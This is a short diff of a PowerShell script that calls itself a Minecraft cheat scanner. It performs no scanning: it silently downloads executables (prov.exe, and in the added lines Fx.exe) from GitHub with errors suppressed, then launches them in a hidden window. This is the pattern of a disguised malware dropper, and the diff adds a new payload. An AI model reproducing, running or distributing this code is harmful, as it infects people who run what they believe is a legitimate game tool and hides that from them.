@@ -1,8 +1,8 @@
 # MINECRAFT CHEAT SCANNER v2.0 https://github.com/kilordow/chekerr/releases/download/file/wave.exe
-Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/prov.exe" -OutFile "prov.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "prov.exe" -WindowStyle Hidden
+    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
     
 Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/prov.exe" -OutFile "prov.exe" -ErrorAction SilentlyContinue
     
